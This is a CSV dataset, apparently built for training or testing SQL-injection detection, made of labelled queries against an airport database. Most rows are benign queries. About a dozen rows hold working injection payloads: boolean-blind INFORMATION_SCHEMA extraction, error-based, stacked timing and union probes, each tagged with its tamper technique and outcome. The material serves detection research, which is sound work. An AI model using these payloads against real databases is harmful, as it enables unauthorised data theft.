"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""ES-MD""",0,SA ES-MD,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BA"" GROUP BY r.name ORDER BY r.name ASC;",0,BA,,,,select,airport-S16,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4429"" AS SIGNED) AND a.iso_country = ""EH"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4429 EH,,,,select,airport-S22,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (86944, ""NTW"", ""Hauser"", ""DME"", 113500, ""DE"")",0,86944 NTW Hauser DME 113500 DE,,,,insert,airport-I10,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Conemaugh"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Berea District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Sierra Leonean airports"", ""%"");",0,Conemaugh Airports in Berea District Sierra Leonean airports,,,,select,airport-S18,,,test
"UPDATE airport SET name = ""Weddell Island Airport"" WHERE ident = ""SDR4""",0,Weddell Island Airport SDR4,,,,update,airport-U1,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (67120, 18576, ""YDMF"", ""AFIS"", ""NORCAL APP/DEP) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(3464 LIKE 3464,1))),0x7171717171,0x78))x))-- AYNX"", 126.375)",1," 67120 18576 ""YDMF"" ""AFIS"" ""NORCAL APP/DEP  AND EXP(~(SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(3464 LIKE 3464,1   ,0x7171717171,0x78  x  -- AYNX"" 126.375 ",recon,equaltolike,success,insert,airport-I8,error-43,error,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""DO"" GROUP BY r.name ORDER BY r.name ASC;",0,DO,,,,select,airport-S16,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""MX-1311"",""heliport"", ""Sala Gate Airport"",""https://en.wikipedia.org/wiki/Mullewa_Airport"",""SA"")",0,MX-1311 heliport Sala Gate Airport https://en.wikipedia.org/wiki/Mullewa_Airport SA,,,,insert,airport-I3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SB"" GROUP BY r.name ORDER BY r.name ASC;",0,SB,,,,select,airport-S16,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 62.0 AND 1880.0",0,62.0 1880.0,,,,select,airport-S2,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""SE-0004"";",0,SE-0004,,,,select,airport-S7,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4231"" AS SIGNED) AND a.iso_country = ""IR)));SELECT BENCHMARK(5000000,MD5(0x4c695077)) AND (((6137=6137"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",1," 4231 IR)));SELECT BENCHMARK(5000000,MD5(0x4c695077)) AND (((6137=6137 ",recon,sleep2getlock,failure,select,airport-S22,stacked-267,stacked,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""HU-BE"", ""Khanty-Mansi Autonomous Okrug"", ""SA"", ""ZM"", ""https://en.wikipedia.org/wiki/Saarland"", ""Airports in Saint Paul Parish"")",0,HU-BE Khanty-Mansi Autonomous Okrug SA ZM https://en.wikipedia.org/wiki/Saarland Airports in Saint Paul Parish,,,,insert,airport-I4,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Goiânia"" and 2516=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x726567696f6e73 and table_schema=0x64617461736574 limit 4,1),2,1))>104) then 2516 else (select 9739 union select 4553) end))-- -;""",1," Goiânia"" and 2516=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x726567696f6e73 and table_schema=0x64617461736574 limit 4,1),2,1))>104) then 2516 else (select 9739 union select 4553) end))-- - ",exploit,lowercase,success,select,airport-S21,boolean-258,boolean,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES ((select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 7,1),9,1))>96) then 23192 else (select 4090 union select 4215) end)), ""LKMO"", 2290.0, ""ASPH-P"", 1, 0)",1," (select (case when (ord(mid((select ifnull(cast(column_name as nchar ,0x20  from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 7,1 ,9,1  >96  then 23192 else (select 4090 union select 4215  end   LKMO 2290.0 ASPH-P 1 0 ",exploit,lowercase,success,insert,airport-I9,boolean-48,boolean,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Shanghai Tangchen Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Shanghai Tangchen Heliport,,,,select,airport-S14,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Cherokee Airpark"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Cherokee Airpark,,,,select,airport-S14,,,test
"DELETE FROM regions WHERE name = ""Saint Patrick"";",0,Saint Patrick,,,,delete,airport-D8,,,test
"SELECT * FROM airport WHERE gps_code = ""RK48"" OR local_code = ""CNV5""",0,RK48 CNV5,,,,select,airport-S4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LY"" GROUP BY r.name ORDER BY r.name ASC;",0,LY,,,,select,airport-S5,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Formerly L28"") OR name LIKE ""FLE, FLE""",0,"Formerly L28 FLE, FLE",,,,select,airport-S10,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SDNX"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Kgatleng District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Grenadian airports"", ""%"");",0,SDNX Airports in Kgatleng District Grenadian airports,,,,select,airport-S18,,,test
SELECT * FROM airport WHERE icao_code = 'LIRI';,0,LIRI,,,,select,airport-S1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 2733.0 AND 605.0",0,2733.0 605.0,,,,select,airport-S2,,,test
"DELETE FROM navaids WHERE ident = ""HH"";",0,HH,,,,delete,airport-D6,,,train
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Alliston (Stevenson Memorial Hospital) Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Alliston (Stevenson Memorial Hospital) Heliport,,,,select,airport-S14,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""US"" OR c.name LIKE CONCAT(""%"", ""South Africa"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,US South Africa 5,,,,select,airport-S20,,,test
"INSERT INTO countries (code, name, continent) VALUES (""SH"", ""Eritrea"", ""AS"")",0,SH Eritrea AS,,,,insert,airport-I7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PM"" GROUP BY r.name ORDER BY r.name ASC;",0,PM,,,,select,airport-S16,,,train
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""NL""",0,NL,,,,select,airport-S9,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Dore Lake Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Dore Lake Airport,,,,select,airport-S14,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Formerly 8W8"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""3IL9, Sugar Creek Farm"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""3SD6"", ""%"");",0,"Formerly 8W8 3IL9, Sugar Creek Farm 3SD6",,,,select,airport-S17,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Dungog Hospital Helipad"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Dungog Hospital Helipad,,,,select,airport-S14,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Sages Airfield"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Sages Airfield,,,,select,airport-S14,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""JE"" GROUP BY r.name ORDER BY r.name ASC;",0,JE,,,,select,airport-S5,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""6263"" AS SIGNED) AND a.iso_country = ""GQ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,6263 GQ,,,,select,airport-S22,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""LFYL"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Fejér County"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Ethiopian airports"", ""%"");",0,LFYL Airports in Fejér County Ethiopian airports,,,,select,airport-S18,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,train
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""6316"" AS SIGNED) AND a.iso_country = ""IQ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,6316 IQ,,,,select,airport-S22,,,test
"SELECT * FROM airport WHERE continent = ""AF"" AND iso_region LIKE ""BG-03""",0,AF BG-03,,,,select,airport-S8,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),17,1))>112,4605) AND ""SD"" LIKE ""SD"", ""Tanzania"", ""EU"", ""Airports in Sint Maarten"")",1," SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x6e617661696473 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),17,1))>112,4605) AND ""SD"" LIKE ""SD Tanzania EU Airports in Sint Maarten ",exploit,equaltolike,success,insert,airport-I6,boolean-30,boolean,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 4094=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 13,1),5,1))>95) then 4094 else (select 4864 union select 7222) end))-- -""",1," Jindal Heliport  and 4094=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 13,1),5,1))>95) then 4094 else (select 4864 union select 7222) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('US-9302','US-10431','SVVA','SBNA');",0,US-9302 US-10431 SVVA SBNA,,,,update,airport-U10,,,test
"UPDATE navaids SET name = ""Ballykelly"" WHERE ident = ""STJ"";",0,Ballykelly STJ,,,,update,airport-U7,,,test
"SELECT * FROM airport WHERE gps_code = ""KVBT"" OR local_code = ""27LA""",0,KVBT 27LA,,,,select,airport-S4,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (53233, 3952, ""(CASE/**/WHEN/**/2380=1449/**/THEN/**/2380/**/ELSE/**/NULL/**/END)"", ""CTAF"", ""GND"", 125.525)",1," 53233 3952 ""(CASE/**/WHEN/**/2380=1449/**/THEN/**/2380/**/ELSE/**/NULL/**/END "" ""CTAF"" ""GND"" 125.525 ",recon,space2comment,failure,insert,airport-I8,boolean-42,boolean,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Camping Flugplatz Dolmar"") OR name LIKE ""KT Goyang Building""",0,Camping Flugplatz Dolmar KT Goyang Building,,,,select,airport-S10,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Ningxia Autonomous Region"";",0,Ningxia Autonomous Region,,,,select,airport-S15,,,test
"DELETE FROM navaids WHERE ident = ""SB"";",0,SB,,,,delete,airport-D6,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 1285.0",0,BR 1285.0,,,,select,airport-S11,,,test
"UPDATE airport SET home_link = ""http://www.atikokaninfo.com/community/transportation/airport/"" WHERE name = ""Carnegie Station Airport""",0,http://www.atikokaninfo.com/community/transportation/airport/ Carnegie Station Airport,,,,update,airport-U4,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Uşak Airport"");",0,Uşak Airport,,,,select,airport-S12,,,test
"DELETE FROM airport WHERE name = ""Fazenda Cerro Porã Airport"";  ",0,Fazenda Cerro Porã Airport,,,,delete,airport-D2,,,test
"UPDATE airport SET name = ""Silva Jardim Helipad"" WHERE ident = ""RJBH""",0,Silva Jardim Helipad RJBH,,,,update,airport-U1,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tarry Bank Airport"") and 4633=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 9,1),5,1))>98) then 4633 else (select 6558 union select 6504) end))-- -"");",1," Tarry Bank Airport"") and 4633=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 9,1),5,1))>98) then 4633 else (select 6558 union select 6504) end))-- - ",exploit,lowercase,success,select,airport-S12,boolean-222,boolean,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""North Star Ranch Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,North Star Ranch Airport,,,,select,airport-S14,,,test
"UPDATE airport SET home_link = ""http://www.flycxy.com/"" WHERE name = ""St Andrews LZ Heliport""",0,http://www.flycxy.com/ St Andrews LZ Heliport,,,,update,airport-U4,,,test
"UPDATE airport SET home_link = ""http://www.aai.aero/allAirports/gorakhpur.jsp"" WHERE name = ""Yale Airport""",0,http://www.aai.aero/allAirports/gorakhpur.jsp Yale Airport,,,,update,airport-U4,,,train
"UPDATE airport SET home_link = ""http://www.mas-des-grailles.com/le-ciel.html"" WHERE name = ""Hawks Run Airport""",0,http://www.mas-des-grailles.com/le-ciel.html Hawks Run Airport,,,,update,airport-U4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SINS"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Daeseok-ri"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""CZ5"", ""%"");",0,SINS Daeseok-ri CZ5,,,,select,airport-S17,,,test
"UPDATE navaids SET name = ""Orca Bay"" WHERE ident = ""KM"";",0,Orca Bay KM,,,,update,airport-U7,,,test
"UPDATE airport SET municipality = ""San Jacinto"" WHERE iso_country = ""KR""",0,San Jacinto KR,,,,update,airport-U2,,,test
"SELECT * FROM airport WHERE gps_code = ""SI3U"" OR local_code = ""RR0043""",0,SI3U RR0043,,,,select,airport-S4,,,test
"UPDATE airport_frequencies SET frequency_mhz = 135.2 WHERE type = ""CTAF"";",0,135.2 CTAF,,,,update,airport-U6,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""CL""",0,CL,,,,select,airport-S6,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""PN"", ""Peru"", ""AF"", ""Аеропорти України"")",0,PN Peru AF Аеропорти України,,,,insert,airport-I6,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""PL-0260"";",0,PL-0260,,,,select,airport-S7,,,train
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Fukuoka Prefecture"";",0,Fukuoka Prefecture,,,,select,airport-S15,,,test
"UPDATE airport_frequencies SET frequency_mhz = 124.7 WHERE type = ""TWR"";",0,124.7 TWR,,,,update,airport-U6,,,train
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""US"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,US 4,,,,select,airport-S19,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""CN-0052"", ""heliport"", ""Zion Helicopters Heliport"", 19.410618, 146.152614)",0,CN-0052 heliport Zion Helicopters Heliport 19.410618 146.152614,,,,insert,airport-I1,,,train
SELECT * FROM airport WHERE icao_code = 'LFPC';,0,LFPC,,,,select,airport-S1,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""EGBR"") OR name LIKE ""00D, Lewiston""",0,"EGBR 00D, Lewiston",,,,select,airport-S10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""UZ"" OR c.name LIKE CONCAT(""%"", ""Ghana"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,UZ Ghana 5,,,,select,airport-S20,,,test
"DELETE FROM countries WHERE code = ""IT"";",0,IT,,,,delete,airport-D7,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Alberta"";",0,Alberta,,,,select,airport-S15,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""MP"" OR c.name LIKE CONCAT(""%"", ""Eswatini"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,MP Eswatini 4,,,,select,airport-S20,,,test
"SELECT * FROM airport WHERE continent = ""AF"" AND iso_region LIKE ""RO-AR""",0,AF RO-AR,,,,select,airport-S8,,,test
"UPDATE airport_frequencies SET frequency_mhz = 123.4 WHERE type = ""-1947) AS TiYv WHERE 7226=7226 ORDER BY 2536-- -"";",1, 123.4 -1947) AS TiYv WHERE 7226=7226 ORDER BY 2536-- - ,recon,commentbeforeparentheses,failure,update,airport-U6,union-86,union,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""NL-XX"", ""38"", ""Southern District"", ""EU"", ""BJ"")",0,NL-XX 38 Southern District EU BJ,,,,insert,airport-I5,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""SDKG"", ""closed"", ""Meligan Airport"", -10.563555, -68.817778, 219.0)",0,SDKG closed Meligan Airport -10.563555 -68.817778 219.0,,,,insert,airport-I2,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Fort Jensen Airport"");",0,Fort Jensen Airport,,,,select,airport-S12,,,test
"DELETE FROM regions WHERE name = ""Cluj County"";",0,Cluj County,,,,delete,airport-D8,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Grist Lake Airport""",0,Grist Lake Airport,,,,select,airport-S3,,,test
"DELETE FROM countries WHERE code = ""VE"";",0,VE,,,,delete,airport-D7,,,train
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (89827, ""ZG"", ""Khoram Abad"", ""NDB"", 362, ""CA"")",0,89827 ZG Khoram Abad NDB 362 CA,,,,insert,airport-I10,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 4671=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 16,1),13,1))>72) then 4671 else (select 7201 union select 7225) end))-- -""",1," Jindal Heliport  and 4671=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 16,1),13,1))>72) then 4671 else (select 7201 union select 7225) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"DELETE FROM airport WHERE name LIKE ""Rio Branco-Plácido de Castro International Airport"" OR keywords LIKE ""یکاولنگ"";  ",0,Rio Branco-Plácido de Castro International Airport یکاولنگ,,,,delete,airport-D3,,,test
"DELETE FROM countries WHERE code = ""CH"";",0,CH,,,,delete,airport-D7,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SWXK"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Demerara-Mahaica"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aeropuertos de Honduras"", ""%"");",0,SWXK Airports in Demerara-Mahaica Aeropuertos de Honduras,,,,select,airport-S18,,,test
"UPDATE countries SET keywords = ""Aeropuertos de Argentina"" WHERE code = ""BS"";",0,Aeropuertos de Argentina BS,,,,update,airport-U8,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""3963"" AS SIGNED) AND a.iso_country = ""BQ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,3963 BQ,,,,select,airport-S22,,,test
SELECT * FROM airport WHERE icao_code = 'YPDO';,0,YPDO,,,,select,airport-S1,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Las Carreras Airstrip"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Las Carreras Airstrip,,,,select,airport-S14,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""RU"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,RU 2,,,,select,airport-S19,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Samarqand Region"" AND 5189 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 18,1),11,1))>72) THEN 5189 ELSE (SELECT 4882 UNION SELECT 4783) END))-- -"";",1," Samarqand Region"" AND 5189 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 18,1),11,1))>72) THEN 5189 ELSE (SELECT 4882 UNION SELECT 4783) END))-- - ",exploit,equaltolike,success,select,airport-S15,boolean-234,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""MF"" GROUP BY r.name ORDER BY r.name ASC;",0,MF,,,,select,airport-S5,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CZ"" GROUP BY r.name ORDER BY r.name ASC;",0,CZ,,,,select,airport-S16,,,test
"DELETE FROM airport WHERE name LIKE ""Kostervig Mon Airfield"" OR keywords LIKE ""7CO5"";  ",0,Kostervig Mon Airfield 7CO5,,,,delete,airport-D3,,,train
"SELECT * FROM airport WHERE gps_code = ""SDA8"" OR local_code = ""SSZZ""",0,SDA8 SSZZ,,,,select,airport-S4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""MO"" GROUP BY r.name ORDER BY r.name ASC;",0,MO,,,,select,airport-S16,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Milennium Heliport"");",0,Milennium Heliport,,,,select,airport-S12,,,test
